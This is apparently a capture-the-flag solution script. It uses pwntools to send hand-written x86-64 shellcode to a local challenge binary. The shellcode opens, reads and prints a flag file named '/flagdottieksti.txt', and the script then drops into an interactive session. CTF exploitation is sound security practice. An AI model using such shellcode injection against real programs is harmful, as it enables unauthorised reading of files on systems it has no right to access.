from pwn import *
context.binary = ELF("./chall")

r = process()
sleep(3)

shellcode = asm("""
    xor rax, rax
    push rax                         # push null terminator
    mov rbx, 0x0000000000747874      # "txt\x00\x00\x00\x00\x00\x00"
    push rbx
    mov rbx, 0x2e6974736b656974      # "tieksti."
    push rbx
    xor rbx,rbx
    mov rbx, 0x746f6467616c662f      # "/flagdot"
    push rbx

    mov rdi, rsp                     # filename pointer
    xor rsi, rsi                     # O_RDONLY = 0
    xor rdx, rdx                     # mode = 0
    mov rax, 2                       # syscall: open
    syscall
    xor rax, rax
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 256
    syscall
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 256
    syscall
""")
print(len(shellcode))
r.sendline(shellcode)
r.interactive()
